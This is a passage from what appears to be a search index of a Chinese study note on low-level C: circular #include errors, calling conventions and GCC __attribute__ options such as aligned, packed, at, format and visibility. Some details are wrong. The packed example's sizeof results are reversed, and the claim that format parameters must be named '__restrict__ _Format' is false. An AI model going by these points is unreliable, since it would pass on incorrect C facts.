0;//\u5012\u6570\u7b2c\u4e09\u4f4d\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u7f16\u8bd1\u5668\u4f7f\u7528\u4e86\u4e00\u79cd\u5f88\u5de7\u5999\u7684\u65b9\u5f0f\u53d6\u5230\u4e86\u6bcf\u4e00\u4f4d\u7684\u6570\uff0c\u8fd9\u4e3b\u8981\u5f52\u529f\u4e8e\u7f16\u8bd1\u5668\u7684\u4f18\u5316\u3002</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#c_3","title":"\u4e94\u3001C\u8bed\u8a00\u4e2d\u7684\u4f9d\u8d56\u5d4c\u5957","text":"<p>\u6211\u4eec\u77e5\u9053\uff0cc\u8bed\u8a00\u5728\u7f16\u8bd1\u65f6\uff0c\u5982\u679c\u6587\u4ef6\u4e2d\u5b58\u5728<code>#include</code>\u7684\u8bed\u53e5\uff0c\u5c31\u4f1a\u5c06\u5bf9\u5e94\u7684\u5934\u6587\u4ef6\u590d\u5236\u8fc7\u6765\uff0c\u66ff\u6362\u6389<code>#include</code>\u8bed\u53e5\uff0c\u90a3\u4e48\u8bbe\u60f3\u6709\u8fd9\u4e48\u4e00\u79cd\u60c5\u51b5\uff0c\u5982\u679c\u6211\u4eec\u5728<code>x.h</code>\u4e2d\u4f9d\u8d56\u4e86<code>y.h</code>\u5728<code>y.h</code>\u4e2d\u6709\u4f9d\u8d56\u4e86<code>x.h</code>\uff0c\u90a3\u4e48\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f</p> <p>\u65f6\u95f4\u51fa\u771f\u7406\uff1a</p> <ol> <li>\u65b0\u5efa\u4e00\u4e2a\u7a7a\u767d\u9879\u76ee\uff0c\u751f\u6210\u4e00\u4e0b\u76ee\u5f55</li> </ol> <p></p> <p>\u7136\u540e\u5bf9\u4e8e\u5404\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u8fdb\u884c\u7f16\u5199</p> <pre><code>//x.h\n#include \"y.h\"\n</code></pre> <pre><code>//y.h\n#include \"x.h\"\n</code></pre> <pre><code>//main.c\n#include \"x.h\"\nint main()\n{\n    return 0;    \n}\n</code></pre> <p>\u4e00\u7f16\u8bd1\u5c31\u62a5\u9519\u4e86</p> <p>[\u9519\u8bef] #include nested depth 200 exceeds maximum of 200 (use -fmax-include-depth=DEPTH to increase the maximum)</p> <p>\u8fd9\u5c31\u662f\u8bf4#include\u5d4c\u5957\u6df1\u5ea6\u8d85\u8fc7200.\u8fd9\u91cc\u4e0d\u662f\u53ea\u6709\u5faa\u73af\u5faa\u73af\u7f16\u8bd1\u4f1a\u5bfc\u81f4\uff0c\u5982\u679c\u7cfb\u7edf\u8bbe\u8ba1\u4e0d\u591f\u826f\u597d\uff0c\u4f9d\u8d56\u5c42\u6570\u8fc7\u591a\u7684\u8bdd\uff0c\u4e5f\u4f1a\u5bfc\u81f4\u4ea7\u751f\u8fd9\u6837\u7684\u7ed3\u679c\u3002</p> <p>\u4eca\u5929\u5728\u770b\u53e5\u67c4\u65f6\uff0c\u7a81\u7136\u60f3\u5230\u6709\u6ca1\u6709\u53ef\u80fd<code>stdio</code>\u4e5f\u662f\u4e00\u4e2a\u53e5\u67c4\u3002\u4e8e\u662f\u5f00\u59cb\u770bc\u8bed\u8a00\u6e90\u7801\uff0c\u53d1\u73b0\u4e86\u4e00\u4e9b\u5f88\u5947\u602a\u7684\u4ee3\u7801\uff0c\u8d85\u51fa\u4e86\u6211\u7684c\u8bed\u8a00\u8ba4\u77e5\u8303\u56f4\u3002</p> <p>\u7ecf\u8fc7\u4e00\u756a\u767e\u5ea6\u548cgoogle\u8fc7\u540e\uff0c\u9010\u6e10\u5bf9\u8fd9\u4e9b\u6709\u4e86\u4e9b\u4e86\u89e3.</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#__cdecl","title":"\u516d\u3001__cdecl","text":"<p>\u76f4\u63a5\u8bf4\u5427\uff01\u8fd9\u4e2a\u662fc\u8bed\u8a00\u5728\u5bf9\u4e8e\u7f16\u8bd1\u5668\u7684\u4e00\u4e2a\u8bed\u6cd5\u3002\u4ed6\u5c31\u662f\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u3002</p> <ol> <li>\u4e3a\u4ec0\u4e48\u8981\u6709\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\uff1f</li> </ol> <p>\u8fd9\u4e2a\u5176\u5b9e\u662f\u5173\u7cfb\u5230c\u8bed\u8a00\u5e95\u5c42\u5bf9\u4e8e\u6808\u5185\u5b58\u7684\u5904\u7406\u3002\u6211\u4eec\u90fd\u77e5\u9053\uff0c\u5728c\u8bed\u8a00\u4e2d\u8c03\u7528\u51fd\u6570\uff0c\u9700\u8981\u5c06\u53c2\u6570\u538b\u5165\u6808\u4e2d\u3002\u90a3\u4e48\u8fd9\u4e2a\u538b\u5165\u6808\u7684\u64cd\u4f5c\u6ca1\u6709\u89c4\u8303\u7684\u8bdd\uff0c\u5982\u4f55\u4fdd\u8bc1\u4f20\u5165\u7684\u53c2\u6570\u548c\u51fd\u6570\u5185\u90e8\u4f7f\u7528\u7684\u53c2\u6570\u610f\u4e49\u5bf9\u5e94\u5462\uff1fmicrosoft\u53c2\u8003\u6587\u6863</p> <pre><code>double divide(int a,int b){\n    return a/b;\n}\n\nint main(){\n    devide(1,2);\n    /*\n    \u8fd9\u91cc\u4f1a\u5c06\u53c2\u6570\u538b\u5165\u6808\u4e2d\uff0c\u53ef\u662f\u6709\u4e24\u4e2a\u53c2\u6570\uff0c\u5148\u538b\u54ea\u4e00\u4e2a\u5462\uff1f\n    \u4e00\u822c\u51fd\u6570\u5165\u6808\u90fd\u662f\u4ece\u53f3\u5230\u5de6\uff0c\u4e5f\u5c31\u662f\u5148\u538b\u51652\uff0c\u7136\u540e\u538b\u51651\n    \u4f46\u662fc\u8bed\u8a00\u4e2d\u4e5f\u5b58\u5728\u4ece\u5de6\u5230\u53f3\u5165\u6808\u7684\u51fd\u6570\uff0c\u867d\u7136\u5f88\u5c11\u3002\n    \u90a3\u4e48\u5728\u7f16\u8bd1\u6210\u6c47\u7f16\u8bed\u8a00\u7684\u65f6\u5019\uff0c\u7f16\u8bd1\u5668\u5230\u5e95\u662f\u5148\u5c06\u8c01\u5165\u6808\uff0c\u88ab\u8c03\u7528\u51fd\u6570\u90a3\u8fb9\u6709\u7528\u4ec0\u4e48\u51e1\u662f\u6765\u5bf9\u5e94\u5f52\u5c5e\u53d8\u91cf\u5462\uff0c\u4e5f\u5c31\u662f\u5427\u95ef\u5165\u7684\u51fd\u6570\u6309\u987a\u5e8f\u5bf9\u5e94\u53d8\u91cf\n    \u8fd9\u65f6\u5c31\u9700\u8981\u4e00\u4e2a\u58f0\u660e\u6765\u8868\u793a\u81ea\u5df1\u7684\u53c2\u6570\u987a\u5e8f\u65b9\u5f0f\u4e86\n    */\n    return 0;\n}\n</code></pre> <ol> <li>\u4ec0\u4e48\u4e8b\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a</li> </ol> <p>\u6b63\u5982\u4e0a\u9762\u6240\u8bf4\uff0c\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a\u5c31\u662f\u544a\u8bc9\u7f16\u8bd1\u5668\u6211\u8fd9\u4e2a\u51fd\u6570\u5728\u4f20\u53c2\u662f\u5e94\u8be5\u7684\u987a\u5e8f\u3002\u5f53\u7136\u4ed6\u4e0d\u53ea\u6709\u8fd9\u4e9b\uff0c\u8fd8\u6709\u5176\u4ed6\u529f\u80fd\u3002</p> <ol> <li>\u6709\u54ea\u4e9b\u51fd\u6570\u8c03\u7528\u7ea6\u5b9a(\u76f4\u63a5\u4ece\u5fae\u8f6f\u62ff\u590d\u5236\u8fc7\u6765\u7684)</li> </ol> \u5173\u952e\u5b57 \u5806\u6808\u6e05\u7406 \u53c2\u6570\u4f20\u9012 __cdecl \u8c03\u7528\u65b9 \u5728\u5806\u6808\u4e0a\u6309\u76f8\u53cd\u987a\u5e8f\u63a8\u9001\u53c2\u6570\uff08\u4ece\u53f3\u5230\u5de6\uff09 __clrcall \u4e0d\u9002\u7528 \u6309\u987a\u5e8f\u5c06\u53c2\u6570\u52a0\u8f7d\u5230 CLR \u8868\u8fbe\u5f0f\u5806\u6808\u4e0a\uff08\u4ece\u5de6\u5230\u53f3\uff09 __stdcall \u88ab\u8c03\u7528\u65b9 \u5728\u5806\u6808\u4e0a\u6309\u76f8\u53cd\u987a\u5e8f\u63a8\u9001\u53c2\u6570\uff08\u4ece\u53f3\u5230\u5de6\uff09 __fastcall \u88ab\u8c03\u7528\u65b9 \u5b58\u50a8\u5728\u5bc4\u5b58\u5668\u4e2d\uff0c\u7136\u540e\u5728\u5806\u6808\u4e0a\u63a8\u9001 __thiscall \u88ab\u8c03\u7528\u65b9 \u5728\u5806\u6808\u4e0a\u63a8\u9001\uff1b\u5b58\u50a8\u5728 ECX \u4e2d\u7684 <code>this</code> \u6307\u9488 __vectorcall \u88ab\u8c03\u7528\u65b9 \u5b58\u50a8\u5728\u5bc4\u5b58\u5668\u4e2d\uff0c\u7136\u540e\u6309\u76f8\u53cd\u987a\u5e8f\u5728\u5806\u6808\u4e0a\u63a8\u9001\uff08\u4ece\u53f3\u5230\u5de6\uff09 <ol> <li>\u90a3\u4e48\u6211\u4eec\u5e73\u5e38\u662f\u4f7f\u7528\u90a3\u79cd\u5462\uff1f</li> </ol> <p>\u6211\u4eec\u4e5f\u6ca1\u6709\u5199\u8fc7\u8fd9\u4e9b\u4e1c\u897f\u5440\uff1f\u4ed6\u9ed8\u8ba4\u5c31\u662f\u6309\u7167<code>__cdecl</code>\u6765\u8c03\u7528\u7684\u3002\u4e5f\u5c31\u662f\u6211\u4eec\u5e73\u5e38\u8bf4\u7684\u4ece\u53f3\u5230\u5de6\u3002</p> <p>\u4ee5\u540e\u6211\u4eec\u6ce8\u610f\u4e86\uff0c\u5982\u679c\u5728\u770b\u5230\u6709\u4eba\u8bf4c\u8bed\u8a00\u7684\u51fd\u6570\u8c03\u7528\u90fd\u662f\u4ece\u53f3\u5230\u5de6\u4f20\u53c2\u7684\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u53cd\u9a73\u4ed6\u4e86\u3002\u76f4\u63a5\u628a\u8fd9\u4e9b\u4e1c\u897f\u7529\u5979\u8138\u4e0a\uff0c\u8ba9\u4ed6\u65e0\u8bdd\u53ef\u8bf4\u3002\u4f46\u662f\u5bf9\u4e8e\u8fd9\u4e9b\u4e1c\u897f\uff0c\u6211\u89c9\u5f97\u4e86\u89e3\u5373\u53ef\uff0c\u4e5f\u5c31\u662f\u770b\u5230\u7684\u65f6\u5019\u4e0d\u81f3\u4e8e\u4e00\u8138\u61f5\u903c\u5c31\u884c\u3002</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#__attribute__","title":"\u4e03\u3001__attribute__","text":"<p>\u563f\u563f\uff0c\u7ec8\u4e8e\u5230\u6211\u4e86\u3002\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u770b\u5230attribute\u8fd9\u4e2a\u5355\u8bcd\u662f\u201c\u5c5e\u6027\u201d\u7684\u610f\u601d\u3002\u90a3\u4ed6\u4e5f\u5c31\u662f\u548c\u5c5e\u6027\u76f8\u5173\u7684\u4e1c\u897f\u55bd\uff01</p> <p>\u627e\u5230\u4e00\u7247\u5b9d\u85cf\u535a\u5ba2\uff0c\u53ef\u4ee5\u53c2\u8003\u53c2\u8003\u3002</p> <p>( attribute \u673a\u5236\u8be6\u89e3_weaiken\u7684\u535a\u5ba2-CSDN\u535a\u5ba2___attribute__)</p> <p>GNU C \u7684\u4e00\u5927\u7279\u8272\u5c31\u662f__attribute__ \u673a\u5236\u3002attribute \u53ef\u4ee5\u8bbe\u7f6e\u51fd\u6570\u5c5e\u6027\uff08Function Attribute \uff09\u3001\u53d8\u91cf\u5c5e\u6027\uff08Variable Attribute \uff09\u548c\u7c7b\u578b\u5c5e\u6027\uff08Type Attribute \uff09\u3002</p> <p>attribute \u4e66\u5199\u7279\u5f81\u662f\uff1aattribute \u524d\u540e\u90fd\u6709\u4e24\u4e2a\u4e0b\u5212\u7ebf\uff0c\u5e76\u5207\u540e\u9762\u4f1a\u7d27\u8ddf\u4e00\u5bf9\u539f\u62ec\u5f27\uff0c\u62ec\u5f27\u91cc\u9762\u662f\u76f8\u5e94\u7684__attribute__ \u53c2\u6570\u3002</p> <p>attribute \u8bed\u6cd5\u683c\u5f0f\u4e3a\uff1aattribute ((attribute-list))</p> <p>\u5173\u952e\u5b57__attribute__ \u4e5f\u53ef\u4ee5\u5bf9\u7ed3\u6784\u4f53\uff08struct \uff09\u6216\u5171\u7528\u4f53\uff08union \uff09\u8fdb\u884c\u5c5e\u6027\u8bbe\u7f6e\u3002\u5927\u81f4\u6709\u516d\u4e2a\u53c2\u6570\u503c\u53ef\u4ee5\u88ab\u8bbe\u5b9a\uff0c\u5373\uff1aaligned, packed, transparent_union, unused, deprecated \u548c may_alias \u3002</p> <p>\u5728\u4f7f\u7528__attribute__ \u53c2\u6570\u65f6\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5728\u53c2\u6570\u7684\u524d\u540e\u90fd\u52a0\u4e0a\u201c__\u201d \uff08\u4e24\u4e2a\u4e0b\u5212\u7ebf\uff09\uff0c\u4f8b\u5982\uff0c\u4f7f\u7528__aligned__\u800c\u4e0d\u662faligned \uff0c\u8fd9\u6837\uff0c\u4f60\u5c31\u53ef\u4ee5\u5728\u76f8\u5e94\u7684\u5934\u6587\u4ef6\u91cc\u4f7f\u7528\u5b83\u800c\u4e0d\u7528\u5173\u5fc3\u5934\u6587\u4ef6\u91cc\u662f\u5426\u6709\u91cd\u540d\u7684\u5b8f\u5b9a\u4e49\u3002</p> <ol> <li> <p>\u597d\u4e86\uff0c\u4e0d\u591a\u89e3\u91ca\uff0c\u76f4\u63a5\u4e0a\u4f8b\u5b50</p> </li> <li> <p>aligned()</p> <pre><code>struct s{\n   char b;\n   int a;\n   short s;\n} __attribute__ ((aligned(8)));\n/*\u5982\u679c\u52a0\u4e86attribute:\nsizeof(struct s)==16;\n\u5982\u679c\u6ca1\u6709\u52a0:\nsizeof(struct s)==12;\n*/\n</code></pre> <p>\u6ce8\u610f\u4e8b\u9879\uff1a</p> <ol> <li>\u6ce8\u610f\u62ec\u53f7\u7684\u5c42\u6570\uff0c\u591a\u4e00\u5c42\u6216\u8005\u5c11\u4e00\u5c42\u90fd\u4f1a\u51fa\u95ee\u9898</li> <li>aligned\u91cc\u9762\u7684\u53ea\u80fd\u662f2\u7684\u591a\u5c11\u6b21\u65b9\u7684\u6570\uff0c\u5982\u679c\u662f10\u6216\u8005\u5176\u4ed6\u4f1a\u62a5\u9519\uff0c\u4f46\u662f1\u662f\u53ef\u4ee5\u7684\uff0c\u867d\u7136\u6ca1\u5565\u7528\u3002</li> <li>\u8fd9\u91cc\u548c<code>#pragma pack()</code>\u6709\u6240\u533a\u522b\uff0c\u8fd9\u91cc\u662f\u5bf9\u8c61\u5916\u90e8\u7684\u5bf9\u9f50\u65b9\u5f0f\uff0c\u4e5f\u5c31\u662f\u5c06\u8fd9\u4e2a\u7ed3\u6784\u4f53\u770b\u6210\u4e00\u4e2a\u6574\u4f53\u7684\u6570\u636e\u7c7b\u578b\u6765\u5bf9\u9f50\uff0c\u5bf9\u4e8e\u5185\u90e8\u7684\u662f\u6ca1\u6709\u5f71\u54cd\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f7f\u7528\u8fd9\u4e2a\u53ea\u4f1a\u589e\u5927\uff0c\u4e0d\u4f1a\u51cf\u5c11\u3002</li> <li>\u5982\u679c\u6ca1\u6709\u6700\u91cc\u9762\u90a3\u4e2a\u62ec\u53f7\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u6ca1\u6709\u624b\u52a8\u8bbe\u7f6e\u5bf9\u9f50\u65b9\u5f0f\uff0c\u90a3\u4e48\u7f16\u8bd1\u5668\u4f1a\u81ea\u5df1\u51b3\u5b9a\u3002\u4f46\u662f\u4e0d\u4f1a\u62a5\u9519\u3002\u5982\u679c\u6700\u5916\u4e24\u4e2a\u62ec\u53f7\u6ca1\u4e86\u5c31\u4f1a\u62a5\u9519\u3002</li> </ol> </li> <li> <p>packed</p> <p>\u4f7f\u7528\u8be5\u5c5e\u6027\u5bf9struct \u6216\u8005union \u7c7b\u578b\u8fdb\u884c\u5b9a\u4e49\uff0c\u8bbe\u5b9a\u5176\u7c7b\u578b\u7684\u6bcf\u4e00\u4e2a\u53d8\u91cf\u7684\u5185\u5b58\u7ea6\u675f\u3002\u5c31\u662f\u544a\u8bc9\u7f16\u8bd1\u5668\u53d6\u6d88\u7ed3\u6784\u5728\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u7684\u4f18\u5316\u5bf9\u9f50\uff08\u4f7f\u75281\u5b57\u8282\u5bf9\u9f50\uff09,\u6309\u7167\u5b9e\u9645\u5360\u7528\u5b57\u8282\u6570\u8fdb\u884c\u5bf9\u9f50\uff0c\u662fGCC\u7279\u6709\u7684\u8bed\u6cd5\u3002\u8fd9\u4e2a\u529f\u80fd\u662f\u8ddf\u64cd\u4f5c\u7cfb\u7edf\u6ca1\u5173\u7cfb\uff0c\u8ddf\u7f16\u8bd1\u5668\u6709\u5173\uff0cgcc\u7f16\u8bd1\u5668\u4e0d\u662f\u7d27\u51d1\u6a21\u5f0f\u7684\uff0c\u6211\u5728windows\u4e0b\uff0c\u7528vc\u7684\u7f16\u8bd1\u5668\u4e5f\u4e0d\u662f\u7d27\u51d1\u7684\uff0c\u7528tc\u7684\u7f16\u8bd1\u5668\u5c31\u662f\u7d27\u51d1\u7684\u3002</p> <pre><code>struct packed_struct\n{\n     char c;\n     int  i;\n     struct unpacked_struct s;\n}__attribute__ ((__packed__));\n/*\u5982\u679c\u52a0\u4e86attribute:\nsizeof(struct s)==8;\n\u5982\u679c\u6ca1\u6709\u52a0:\nsizeof(struct s)==5;\n*/\n</code></pre> <ul> <li>\u6ce8\u610f\u4e8b\u9879</li> <li>\u8fd9\u91cc\u7684<code>packed</code>\u867d\u7136\u548c<code>#pragma pack()</code>\u5f88\u50cf\uff0c\u4f46\u662f\u540e\u8005\u662f\u5168\u5c40\u7684\uff0c\u4e8c\u524d\u8005\u662f\u5c40\u90e8\u7684\uff0c\u5404\u6709\u5229\u5f0a\u3002</li> <li>\u8fd9\u4e2a\u547d\u4ee4\u548c<code>aligned</code>\u5c31\u6070\u597d\u76f8\u53cd\u4e86\uff0c\u4ed6\u662f\u6700\u5927\u9650\u5ea6\u7684\u4f18\u5316\u5b58\u50a8\u3002</li> <li>\u7701\u7a7a\u95f4\uff0c\u4f46\u662f\u5f88\u9ebb\u70e6\uff0c\u5728\u7f51\u7edc\u4f20\u8f93\u4e2d\u4e3a\u4e86\u8282\u7701\u7f51\u7edc\u8d44\u6e90\uff0c\u9ed8\u8ba4\u90fd\u662f\u4f7f\u75281\u5b57\u8282\u5bf9\u9f50\u5927\u7aef\u6a21\u5f0f\u7684\u65b9\u5f0f\u4f20\u8f93\uff0c\u4e3a\u4e86\u7f16\u5199\u65b9\u4fbf\uff0c\u76f4\u63a5\u4f7f\u7528<code>#pragm pack(1)</code>\u3002</li> </ul> </li> <li> <p>at</p> <p>\u7edd\u5bf9\u5b9a\u4f4d\uff0c\u53ef\u4ee5\u628a\u53d8\u91cf\u6216\u51fd\u6570\u7edd\u5bf9\u5b9a\u4f4d\u5230Flash\u4e2d\uff0c\u6216\u8005\u5b9a\u4f4d\u5230RAM\u3002(\u6ce8\u610f\uff0c\u8fd9\u91cc\u7684flash\u4e0d\u662f\u6211\u4eec\u5e38\u8bf4\u7684flash\uff0c\u800c\u662f\u95ea\u5b58)</p> <pre><code>//\u5b9a\u4f4d\u5230flash\u4e2d\uff0c\u4e00\u822c\u7528\u4e8e\u56fa\u5316\u7684\u4fe1\u606f\uff0c\u5982\u51fa\u5382\u8bbe\u7f6e\u7684\u53c2\u6570\uff0c\u4e0a\u4f4d\u673a\u914d\u7f6e\u7684\u53c2\u6570\uff0cID\u5361\u7684ID\u53f7\uff0cflash\u6807\u8bb0\u7b49\u7b49\nconst u16 gFlashDefValue[512] __attribute__((at(0x0800F000))) = {0x1111,0x1111,0x1111,0x0111,0x0111,0x0111};\n//\u5b9a\u4f4d\u5728flash\u4e2d,\u5176\u4ed6flash\u8865\u5145\u4e3a00\nconst u16 gflashdata__attribute__((at(0x0800F000))) = 0xFFFF;\n//==========\n//\u4e0a\u9762\u7684\u5df2\u7ecf\u770b\u5f97\u5934\u5927\u4e86\u5427\uff0c\u6ca1\u4e8b\uff0c\u53ea\u8981\u4e86\u89e3\u5373\u53ef\n//============================================\n//\u5b9a\u4f4d\u5230RAM\u4e2d\uff0c\u4e00\u822c\u7528\u4e8e\u6570\u636e\u91cf\u6bd4\u8f83\u5927\u7684\u7f13\u5b58\uff0c\u5982\u4e32\u53e3\u7684\u63a5\u6536\u7f13\u5b58\uff0c\u518d\u5c31\u662f\u67d0\u4e2a\u4f4d\u7f6e\u7684\u7279\u5b9a\u53d8\u91cf\nu8 USART2_RX_BUF[USART2_REC_LEN] __attribute__ ((at(0X20001000)));\n//\u63a5\u6536\u7f13\u51b2,\u6700\u5927USART_REC_LEN\u4e2a\u5b57\u8282,\u8d77\u59cb\u5730\u5740\u4e3a0X20001000.\n</code></pre> <ul> <li>\u6ce8\u610f\uff1a</li> <li>\u7edd\u5bf9\u5b9a\u4f4d\u4e0d\u80fd\u5728\u51fd\u6570\u4e2d\u5b9a\u4e49\uff0c\u5c40\u90e8\u53d8\u91cf\u662f\u5b9a\u4e49\u5728\u6808\u533a\u7684\uff0c\u6808\u533a\u7531MDK\u81ea\u52a8\u5206\u914d\u3001\u91ca\u653e\uff0c\u4e0d\u80fd\u5b9a\u4e49\u4e3a\u7edd\u5bf9\u5730\u5740\uff0c\u53ea\u80fd\u653e\u5728\u51fd\u6570\u5916\u5b9a\u4e49\u3002</li> <li>\u5b9a\u4e49\u7684\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7\u6808\u6216Flash\u7684\u5927\u5c0f\uff0c\u5426\u5219\uff0c\u9020\u6210\u6808\u3001Flash\u6ea2\u51fa\u3002</li> </ul> </li> <li> <p>format</p> <p>format\u7684\u8bed\u6cd5\u683c\u5f0f\u4e3a\uff1a format (archetype, string-index, first-to-check) \u5176\u4e2d\uff0c\u201carchetype\u201d\u6307\u5b9a\u662f\u54ea\u79cd\u98ce\u683c\uff1b\u201cstring-index\u201d\u6307\u5b9a\u4f20\u5165\u51fd\u6570\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1b\u201cfirst-to-check\u201d\u6307\u5b9a\u4ece\u51fd\u6570\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570\u5f00\u59cb\u6309\u4e0a\u8ff0\u89c4\u5219\u8fdb\u884c\u68c0\u67e5\u3002 \u5177\u4f53\u7684\u4f7f\u7528\u5982\u4e0b\u6240\u793a\uff1a attribute((format(printf, a, b))) attribute((format(scanf, a, b))) \u5176\u4e2d\u53c2\u6570m\u4e0en\u7684\u542b\u4e49\u4e3a\uff1a \u3000\u3000\u3000\u3000a\uff1a\u7b2c\u51e0\u4e2a\u53c2\u6570\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32(format string); \u3000\u3000\u3000\u3000b\uff1a\u53c2\u6570\u96c6\u5408\u4e2d\u7684\u7b2c\u4e00\u4e2a\uff0c\u5373\u53c2\u6570\u201c\u2026\u201d\u91cc\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5728\u51fd\u6570\u53c2\u6570\u603b\u6570\u6392\u5728\u7b2c\u51e0\u3002</p> <pre><code>//\u9996\u5148\u5c55\u793a\u4e00\u4e0bprintf\u7684\u51fd\u6570\u58f0\u660e\n__attribute__((__format__ (ms_printf, 1, 2))) __MINGW_ATTRIB_NONNULL(1)\nint __cdecl printf(const char * __restrict__ _Format,...);\n</code></pre> <ul> <li>\u6ce8\u610f\u4e8b\u9879</li> <li>\u53ea\u6709\u662f\u53ef\u53d8\u53c2\u6570\u51fd\u6570\u624d\u53ef\u4ee5\u7528\u3002</li> <li>\u5fc5\u987b\u6307\u660eformat\u53c2\u6570</li> <li>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5f62\u53c2\u547d\u540d\u5fc5\u987b\u662f<code>__restrict__</code>\uff0c\u7136\u540e\u540e\u9762\u8ddf\u7740\u4e00\u4e2a<code>_Format</code>\uff0c\u4e25\u683c\u533a\u5206\u5927\u5c0f\u5199\u3002</li> </ul> </li> <li> <p>visibility</p> <p>\u8fd9\u4e2a\u5b57\u6bb5\u5fc5\u987b\u4ecb\u7ecd\uff0c\u56e0\u4e3a\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ed6\u6765\u65f6\u5148\u5c01\u88c5\u3002\u5728\u4e0d\u662f\u9762\u5411\u5bf9\u8c61\u7684\u8bed\u8a00\u91cc\u9762\u5b9e\u73b0\u5c01\u88c5\u4e0d\u662f\u5f88\u9177\u5417\uff1f\u800c\u4e14\u8fd8\u53ef\u4ee5\u907f\u514d\u7b26\u53f7\u51b2\u7a81\u7684\u60c5\u51b5\u3002</p> <p>visibility_type \u7c7b\u578b\u67094\u79cd\uff1a</p> <ol> <li>default    default \u53ef\u89c1\u6027\u662f\u9ed8\u8ba4\u7684\u7b26\u53f7\u94fe\u63a5\u53ef\u89c1\u6027\uff0c\u5982\u679c\u6211\u4eec\u4e0d\u6307\u5b9avisibility \u5c5e\u6027\uff0c\u90a3\u4e48\u9ed8\u8ba4\u5c31\u4f7f\u7528\u9ed8\u8ba4\u7684\u53ef\u89c1\u6027\u3002\u9ed8\u8ba4\u53ef\u89c1\u6027\u7684\u5bf9\u8c61\u4e0e\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u5728\u5176\u4ed6\u6a21\u5757\u4e2d\u5f15\u7528\uff0c\u5305\u62ec\u5728\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d \uff0c\u5b83\u5c5e\u4e8e\u4e00\u4e2a\u6b63\u5e38\uff0c\u5b8c\u6574\u7684\u5916\u90e8\u8fde\u63a5\u3002\u76f8\u5f53\u4e8epublic</li> <li>hidden    \u8be5\u7b26\u53f7\u4e0d\u5b58\u653e\u5728\u52a8\u6001\u7b26\u53f7\u8868\u4e2d\uff0c\u56e0\u6b64\uff0c\u5176\u4ed6\u53ef\u6267\u884c\u6587\u4ef6\u6216\u5171\u4eab\u5e93\u90fd\u65e0\u6cd5\u76f4\u63a5\u5f15\u7528\u5b83\u3002\u4f7f\u7528\u51fd\u6570\u6307\u9488\u53ef\u8fdb\u884c\u95f4\u63a5\u5f15\u7528\u3002\u76f8\u5f53\u4e8eprivate</li> <li>internal    \u9664\u975e\u7531 \u7279\u5b9a\u4e8e\u5904\u7406\u5668\u7684\u5e94\u7528\u4e8c\u8fdb\u5236\u63a5\u53e3 (psABI) \u6307\u5b9a\uff0c\u5426\u5219\uff0c\u5185\u90e8\u53ef\u89c1\u6027\u610f\u5473\u7740\u4e0d\u5141\u8bb8\u4ece\u53e6\u4e00\u6a21\u5757\u8c03\u7528\u8be5\u51fd\u6570\u3002</li> <li>protected    \u8be5\u7b26\u53f7\u5b58\u653e\u5728\u52a8\u6001\u7b26\u53f7\u8868\u4e2d\uff0c\u4f46\u5b9a\u4e49\u6a21\u5757\u5185\u7684\u5f15\u7528\u5c06\u4e0e\u5c40\u90e8\u7b26\u53f7\u7ed1\u5b9a\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u53e6\u4e00\u6a21\u5757\u65e0\u6cd5\u8986\u76d6\u8be5\u7b26\u53f7\u3002\u76f8\u5f53\u4e8eprotected</li> </ol> <pre><code>__attribute__((visibility(\"hidden\")))\nint sum(int a){\n   //TODO\n   return a*2;\n}\n//\u8fd9\u6837\u5199\u7684\u8bdd\uff0c\u5982\u679cmain\u51fd\u6570\u5199\u5728\u5176\u4ed6\u6587\u4ef6\u91cc\u9762\uff0c\u5c31\u65e0\u6cd5\u76f4\u63a5\u8c03\u7528sum\u51fd\u6570\u3002\u4f46\u662f\u53ef\u4ee5\n__attribute__((visibility(\"hidden\"))) int s;\n//\u5bf9\u53d8\u91cf\u4e5f\u53ef\u4ee5\u662f\u8bbe\u7f6e\n</code></pre> </li> <li> <p>\u5982\u679c\u60f3\u591a\u4e2a\u5c5e\u6027\u4e00\u8d77\u8bbe\u7f6e\u548b\u529e\uff1f</p> <pre><code>u8 FileAddr[100] __attribute__ ((section (\"FILE_RAM\"), zero_init,aligned(4)));    \n</code></pre> </li> 